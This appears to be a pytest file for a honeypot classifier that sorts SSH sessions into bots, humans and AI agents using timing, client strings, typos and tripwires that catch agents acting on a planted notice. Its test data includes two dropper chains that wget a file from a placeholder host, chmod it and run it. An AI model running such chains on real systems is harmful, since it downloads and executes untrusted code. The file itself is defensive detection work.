import json
from pathlib import Path

import pytest

from brain import classifier as c
from brain.session import Session

FIX = Path(__file__).parent / "fixtures"


def load(name):
    return json.loads((FIX / f"{name}.json").read_text(encoding="utf-8"))


def replay(events, **extra):
    s = Session(session_id=events[0]["session_id"], **extra)
    for e in events:
        s.observe(e)
    return s


@pytest.mark.parametrize("name,kind", [("bot", "bot"), ("human", "human"), ("agent", "agent")])
def test_fixtures_label_correctly(name, kind):
    v = c.score(replay(load(name)))
    assert v.kind == kind
    assert v.confidence >= 0.7
    assert 2 <= len(v.reasons) <= 4
    assert all(isinstance(r, str) and 0 < len(r) <= 120 for r in v.reasons)


def test_bot_reasons_are_sensible():
    reasons = " | ".join(c.score(replay(load("bot"))).reasons)
    assert "bot script" in reasons or "clockwork" in reasons
    assert "clockwork" in reasons


def test_human_reasons_are_sensible():
    reasons = " | ".join(c.score(replay(load("human"))).reasons)
    assert "irregular" in reasons
    assert "whoamii" in reasons


def test_agent_reasons_are_sensible():
    reasons = " | ".join(c.score(replay(load("agent"))).reasons)
    assert "tripwire" in reasons
    assert "steady" in reasons or "follows instructions" in reasons


def test_starts_unknown():
    events = load("agent")
    v = c.score(replay(events[:1]))
    assert v == c.UNKNOWN
    assert v.confidence == 0.0


def test_login_only_scan_stays_unknown_until_enough():
    events = load("bot")
    assert c.score(replay(events[:3])).kind == "unknown"  # start + 2 fails
    v = c.score(replay(events[:5]))  # start + 4 fails
    assert v.kind == "bot"


def test_confidence_grows_as_evidence_arrives():
    events = load("human")
    early = c.score(replay(events[:6]))
    late = c.score(replay(events))
    assert late.confidence >= early.confidence


def test_asn_signals():
    s = Session("x", asn_org="Censys, Inc.", asn_category="scanner")
    assert c.asn_signals(s)[0].label == "bot"
    s = Session("x", asn_org="DigitalOcean", asn_category="cloud")
    assert "hosting" in c.asn_signals(s)[0].reason
    assert c.asn_signals(Session("x")) == []


def test_client_signals():
    assert c.client_signals(Session("x", client="SSH-2.0-Go"))[0].label == "bot"
    labels = {x.label for x in c.client_signals(Session("x", client="SSH-2.0-paramiko_3.4"))}
    assert labels == {"bot", "agent"}
    labels = {x.label for x in c.client_signals(Session("x", client="SSH-2.0-OpenSSH_9.6"))}
    assert labels == {"human"}
    assert c.client_signals(Session("x")) == []


def _with_cmds(gaps, lines=None):
    s = Session("x")
    t = 0.0
    lines = lines or ["ls"] * (len(gaps) + 1)
    s.add_command(t, lines[0], "")
    for g, line in zip(gaps, lines[1:]):
        t += g
        s.add_command(t, line, "")
    return s


def test_timing_signals():
    assert c.timing_signals(_with_cmds([0.2, 0.2, 0.25]))[0].key == "timing_clockwork"
    assert c.timing_signals(_with_cmds([0.1, 0.9, 0.05, 0.8]))[0].key == "timing_fast"
    assert c.timing_signals(_with_cmds([5, 6, 5.5, 6]))[0].key == "timing_steady"
    assert c.timing_signals(_with_cmds([2, 40, 3, 30, 4]))[0].key == "timing_irregular"
    assert c.timing_signals(_with_cmds([1])) == []


def test_typo_detection():
    assert c._typo("whoamii")
    assert c._typo("sl")
    assert c._typo("cd..")
    assert not c._typo("ls")
    assert not c._typo("xmrig")
    s = _with_cmds([3, 3], ["ls", "pwd\x7f\x7fwd", "ls"])
    assert any(x.reason == "backspaces in typed commands" for x in c.content_signals(s))


def test_follows_text_needs_a_doc_read():
    s = Session("x")
    s.add_command(0, "ls", "/srv/app/secret.txt")
    s.add_command(5, "cat /srv/app/secret.txt", "")
    assert not c._follows_text(s.commands)
    s = Session("x")
    s.add_command(0, "cat README.md", "creds in /srv/app/secret.txt")
    s.add_command(5, "cat /srv/app/secret.txt", "")
    assert c._follows_text(s.commands)


def test_should_emit():
    v = c.Verdict("bot", 0.5, ["a", "b"])
    assert c.should_emit("unknown", 0.0, v)
    assert not c.should_emit("bot", 0.45, v)
    assert c.should_emit("bot", 0.3, v)
    assert c.should_emit("human", 0.5, v)


def test_weights_cover_every_signal_key():
    s = replay(load("agent"))
    for sig in c.signals(s):
        assert sig.key in c.WEIGHTS


def test_shared_signals_alone_stay_unknown():
    s = Session("x", client="SSH-2.0-paramiko_3.4.0")
    s.add_login(0, "admin", True)
    s.add_command(1, "pwd", "/root")
    assert c.score(s) == c.UNKNOWN


# ---- quick login-only scans ----

def _scan(client, logins=1, end_at=0.3, ended=True):
    s = Session("x", client=client, started_at=0.0, last_ts=0.0)
    for i in range(logins):
        s.add_login(end_at * (i + 1) / (logins + 1), "root", False)
    if ended:
        s.observe({"type": "session_end", "timestamp": "1970-01-01T00:00:00Z", "detail": {}})
        s.last_ts = end_at
    return s


def test_rumlang_style_scan_is_a_bot():
    v = c.score(replay(load("scanner")))
    assert v.kind == "bot"
    assert v.confidence == pytest.approx(0.7)
    assert "scanner SSH client (Go)" in v.reasons
    assert "tried 1 login in under a second, then left" in v.reasons


def test_quick_scan_waits_for_session_end():
    assert c.score(replay(load("scanner")[:2])) == c.UNKNOWN


@pytest.mark.parametrize("client", ["SSH-2.0-libssh_0.9.6", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-JSCH-0.1.54",
                                    "SSH-2.0-AsyncSSH_2.14.0", "SSH-2.0-Twisted_22.10.0", "SSH-2.0-ZGrab ZGrab SSH Survey"])
def test_quick_scan_matches_scripting_clients(client):
    v = c.score(_scan(client, logins=2, end_at=1.4))
    assert v.kind == "bot"
    assert "tried 2 logins in 1.4s, then left" in v.reasons


@pytest.mark.parametrize("client", ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13", "SSH-2.0-PuTTY_Release_0.80", None])
def test_quick_scan_ignores_normal_clients(client):
    assert c.score(_scan(client)) == c.UNKNOWN


def test_quick_scan_needs_to_be_quick():
    assert c.score(_scan("SSH-2.0-Go", end_at=c.QUICK_SCAN_S + 1)) == c.UNKNOWN


def test_quick_scan_needs_a_login_and_no_commands():
    assert c.score(_scan("SSH-2.0-Go", logins=0)) == c.UNKNOWN
    s = _scan("SSH-2.0-Go")
    s.add_command(0.2, "uname -a", "")
    assert c.quick_scan(s) is None


def test_quick_scan_lifts_a_weak_bot_verdict():
    s = _scan("SSH-2.0-Go", logins=3, end_at=1.2)
    assert c._weighed(s).confidence < c.QUICK_SCAN_CONF
    v = c.score(s)
    assert v.kind == "bot" and v.confidence == pytest.approx(0.7)
    assert "tried 3 logins in 1.2s, then left" in v.reasons


# ---- repeat visitors (one ip_hash, many sessions in the last hour) ----

def test_busy_ip_is_a_bot_regardless_of_client():
    s = _scan("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13", end_at=30.0)
    assert c.score(s) == c.UNKNOWN
    s.recent_sessions = c.REPEAT_VISITS
    v = c.score(s)
    assert v.kind == "bot" and v.confidence == pytest.approx(c.REPEAT_CONF) == pytest.approx(0.75)
    assert v.reasons[0] == "connected 10 times in the last hour"


def test_busy_ip_needs_ten_sessions_and_an_ended_session():
    s = _scan("SSH-2.0-PuTTY_Release_0.80")
    s.recent_sessions = c.REPEAT_VISITS - 1
    assert c.score(s) == c.UNKNOWN
    live = _scan("SSH-2.0-PuTTY_Release_0.80", ended=False)
    live.recent_sessions = 25
    assert c.repeat_visitor(live) is None


def test_busy_ip_beats_a_quick_scan_and_keeps_its_reasons():
    s = _scan("SSH-2.0-Go")
    s.recent_sessions = 14
    v = c.score(s)
    assert v.confidence == pytest.approx(0.75)
    assert v.reasons[:2] == ["connected 14 times in the last hour", "scanner SSH client (Go)"]
    assert len(v.reasons) <= 4


def test_busy_ip_adds_bot_weight_but_leaves_other_kinds_alone():
    s = replay(load("human"))
    weighed = c._weighed(s)
    assert weighed.kind == "human"
    s.recent_sessions = 12
    assert any(x.key == "repeat_visits" and x.label == "bot" for x in c.signals(s))
    # the 0.75 floor only lifts unknown or weaker bot verdicts
    assert c.score(s).kind == "human"


# ---- agent notices, parallel tool calls, short plain sessions ----

def _trip(s, wire, t=1.0):
    s.observe({"type": "tripwire", "timestamp": f"1970-01-01T00:00:{t:06.3f}Z",
               "detail": {"tripwire_id": wire, "reasons": [f"{wire} reason"]}})


def test_reading_the_agent_notice_is_moderate():
    s = Session("x")
    _trip(s, "agent_notice_read")
    sigs = c.tripwire_signals(s)
    assert [x.key for x in sigs] == ["notice_read"]
    assert sigs[0].label == "agent"
    assert 0 < sigs[0].weight < c.WEIGHTS["tripwire"]


@pytest.mark.parametrize("wire", ["agent_echo", "agent_hello"])
def test_acting_on_the_notice_stays_strong(wire):
    s = Session("x")
    _trip(s, "agent_notice_read")
    _trip(s, wire, 2.0)
    keys = {x.key for x in c.tripwire_signals(s)}
    assert keys == {"tripwire", "notice_read"}


def test_notice_read_isnt_counted_twice_as_doc_reading():
    s = _with_cmds([5], ["cat README.md", "ls"])
    _trip(s, "agent_notice_read")
    keys = [x.key for x in c.signals(s)]
    assert "notice_read" in keys
    assert "reads_docs" not in keys


def _short_human():
    """a real visitor: openssh, first try, 4 clean commands, read the home README."""
    s = Session("x", client="SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5")
    s.add_login(0.0, "team", True)
    t = 3.0
    for gap, line in [(0, "ls"), (7.5, "cat README.md"), (6.2, "whoami"), (5.1, "uptime")]:
        t += gap
        s.add_command(t, line, "")
        if line == "cat README.md":
            _trip(s, "agent_notice_read", t)
    return s


def test_short_plain_human_session_is_never_an_agent():
    v = c.score(_short_human())
    assert v.kind in ("human", "unknown")


def test_one_own_signal_is_not_enough_to_win():
    s = Session("x", client="SSH-2.0-OpenSSH_9.6")
    s.add_login(0, "u", True)
    s.add_command(1, "cat README.md", "")
    s.add_command(9, "ls", "")
    assert c.score(s) == c.UNKNOWN


def test_parallel_tool_calls_still_read_as_steady():
    # an agent that sometimes sends two commands from one model turn
    gaps = [3.1, 0.02, 4.4, 5.0, 0.03, 3.6, 4.2, 6.0]
    assert c.timing_signals(_with_cmds(gaps))[0].key == "timing_steady"


def test_a_burst_of_lines_is_still_fast():
    assert c.timing_signals(_with_cmds([0.01, 0.02, 0.01, 0.015]))[0].label == "bot"


def test_steady_needs_enough_turns():
    assert c.timing_signals(_with_cmds([5, 6, 5.5])) == []


def test_labeled_batches_are_an_agent_habit():
    lines = ["hostname; whoami; id; uname -a",
             "nproc; free -h; echo '--- listening ---'; ss -tlnp",
             "cat /etc/nginx/nginx.conf; echo ===README; cat README.md"]
    s = _with_cmds([4, 5], lines)
    keys = {x.key for x in c.content_signals(s)}
    assert "labeled_batches" in keys
    assert "semicolon_chain" not in keys


def test_plain_semicolon_chains_are_still_bot():
    s = _with_cmds([0.3, 0.3], ["cd /tmp; wget http://x.invalid/a; chmod +x a; ./a", "uname -a", "w"])
    assert "semicolon_chain" in {x.key for x in c.content_signals(s)}


# ---- second pass: exit, loose vs regular timing, human habits, agent batching ----

def test_a_final_exit_is_not_a_timing_gap():
    # 4 commands and an exit: only 3 real gaps, too few for steady
    s = _with_cmds([5, 5.5, 5, 6], ["ls", "cat README.md", "whoami", "uptime", "exit"])
    assert c.timing_signals(s) == []


def test_loosely_even_pauses_are_weak():
    sig = c.timing_signals(_with_cmds([3, 7, 4, 8, 5]))[0]
    assert sig.key == "timing_even"
    assert sig.weight == 1.0


def test_truly_regular_pauses_stay_strong():
    sig = c.timing_signals(_with_cmds([5, 5.2, 4.9, 5.1, 5]))[0]
    assert sig.key == "timing_steady"
    assert sig.weight > 1.0


def test_short_single_commands_lean_human():
    s = _with_cmds([4, 6, 5], ["ls", "whoami", "uptime", "pwd"])
    assert "plain_commands" in {x.key for x in c.content_signals(s)}
    s = _with_cmds([4, 6, 5], ["ls; id; w; uname -a", "cat /etc/os-release | head -3; df -h", "free -m", "uptime"])
    assert "plain_commands" not in {x.key for x in c.content_signals(s)}


def test_command_not_found_counts_as_a_slip():
    s = Session("x")
    s.add_command(0, "ls", "README.md")
    s.add_command(4, "gti status", "-bash: gti: command not found")
    s.add_command(8, "ls", "README.md")
    assert "typos" in {x.key for x in c.content_signals(s)}


def test_command_not_found_inside_a_batch_is_not_a_slip():
    s = Session("x")
    s.add_command(0, "getent group sudo; echo '== x =='; nmcli dev", "-bash: nmcli: command not found")
    assert "typos" not in {x.key for x in c.content_signals(s)}


def test_interactive_client_is_a_human_signal():
    sigs = c.client_signals(Session("x", client="SSH-2.0-PuTTY_Release_0.80"))
    assert [(x.label, x.key) for x in sigs] == [("human", "client_interactive")]


def test_sim_human_short_shape_is_human_or_unknown():
    s = _short_human()
    s.add_command(s.commands[-1]["ts"] + 2.0, "exit", "logout")
    assert c.score(s).kind in ("human", "unknown")


def test_two_char_markers_count_as_batches():
    lines = ["echo '== CPU/MEM =='; nproc; free -h; echo '== DISK =='; df -h /",
             "echo '== LISTEN =='; ss -tlnp; echo '== SUDO =='; sudo -n -l 2>&1 | head"]
    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
    assert "labeled_batches" in keys
    assert "semicolon_chain" not in keys


def test_guarded_chains_are_agent_style():
    lines = ["ls -la /opt; cat /etc/hostname; ps aux 2>/dev/null | head; ss -tlnp 2>/dev/null",
             "id; groups; sudo -n true 2>&1; crontab -l 2>/dev/null"]
    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
    assert "labeled_batches" in keys
    assert "semicolon_chain" not in keys


def test_a_guarded_dropper_chain_is_still_bot():
    lines = ["cd /tmp || cd /var/run; wget http://a.b/x 2>/dev/null; chmod 777 x; ./x", "uname -a"]
    keys = {x.key for x in c.content_signals(_with_cmds([0.3], lines))}
    assert "semicolon_chain" in keys
    assert "labeled_batches" not in keys


def _model_agent(notice=True):
    """scripted library, model-paced turns, batched lines, one parallel call."""
    s = Session("x", client="SSH-2.0-AsyncSSH_2.24.1")
    s.add_login(0.0, "team", True)
    lines = ["whoami; id; hostname; uname -a; uptime",
             "echo '== CPU/MEM =='; nproc; free -h; echo '== DISK =='; df -h /",
             "echo '== LISTEN =='; ss -tlnp; echo '== PROCS =='; ps aux | head -20",
             "echo '== NGINX =='; ls -la /etc/nginx/sites-enabled/; cat /etc/nginx/nginx.conf",
             "echo '== HOME =='; ls -la ~; cat ~/README.md",
             "echo '== APP =='; ls -la /opt/app; cat /opt/app/docker-compose.yml",
             "echo '== HEALTH =='; curl -s http://127.0.0.1:8000/health; echo '== WWW =='; ls /var/www/html"]
    t = 4.0
    for gap, line in zip([0, 3.2, 5.1, 0.03, 6.4, 4.0, 7.3], lines):
        t += gap
        s.add_command(t, line, "")
        if notice and "README" in line:
            _trip(s, "agent_notice_read", t)
    return s


@pytest.mark.parametrize("notice", [True, False])
def test_model_paced_batching_library_is_a_confident_agent(notice):
    v = c.score(_model_agent(notice))
    assert v.kind == "agent"
    assert v.confidence >= 0.7


def test_subshell_parens_are_not_typos():
    assert not c._typo("(grep")
    assert not c._typo("head)")
    assert c._typo("(whoamii")


def test_batched_lines_dont_count_as_typing_habits():
    lines = ["echo '== AUTH =='; (grep -h 'Failed' /var/log/auth.log* 2>/dev/null | head); cd /opt; ls",
             "echo '== APP =='; cd /opt/app; ls -la; cd /var/www; ls"]
    keys = {x.key for x in c.content_signals(_with_cmds([5], lines))}
    assert "typos" not in keys
    assert "wandering" not in keys
